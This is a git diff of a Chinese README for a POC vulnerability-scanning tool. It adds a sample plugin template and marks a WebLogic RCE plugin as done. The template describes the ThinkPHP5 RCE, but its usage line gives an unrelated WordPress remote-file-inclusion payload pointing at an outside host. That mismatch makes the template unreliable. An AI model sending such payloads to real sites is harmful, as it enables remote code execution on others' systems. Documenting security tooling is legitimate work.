@@ -60,9 +60,36 @@ pocs -s test2.py -aZ "ThinkPHP"
 3. 单元测试脚本请看test目录下
 
 
-## 插件
-pocs 提供更加灵活的插件分类方式，目前收集到的总结有四类POC: Fuzz POC, OWASP POC, Vuln POC, Tool POC.  POC这块会尽量收集一些github上面已有的POC, 但不会太多，还是需要个人自己去收集整理。
-  
+## POC
+pocs 提供更加灵活的插件分类方式，目前收集到的总结有四类POC: Fuzz POC, OWASP POC, Vuln POC, Tool POC.  POC这块会尽量收集一些github上面已有的POC, 但不会太多，还是需要个人自己去收集整理。f  
+
+POC编写会尽可能规范，遵循POC-T的编写风格。eg如下
+```
+#!/usr/bin/env python		
+#coding:utf-8
+
+"""
+ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞
+
+Desc
+    2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。
+    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，
+    受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
+Version
+	ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29
+Usage:
+	1. python POC-S.py -s 
+	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
+Referer
+	https://www.seebug.org/vuldb/ssvid-9771
+"""
+
+import requests
+
+def poc(url):
+    pass
+```
+
 ### Vuln POC
 主要来源于vulhub的插件编写 以及 POC-T自带的插件poc, 只添加实际
 
@@ -73,7 +100,7 @@ pocs 提供更加灵活的插件分类方式，目前收集到的总结有四类
     
 - [x] weblogic
 	- [x] weblogic-ssrf-netmap.py  cve-2014-4210
-	- [ ] weblogc-wls-rce.py (CVE-2017-10271)
+	- [x] weblogc-wls-rce.py (CVE-2017-10271)
 	- [ ] weblogic-upload-getshell.py (CVE-2018-2894)
 	- [ ] weblogic-deserial-cve20192725.py (CVE-2019-2725)
 	- [ ] CVE-2019-2890
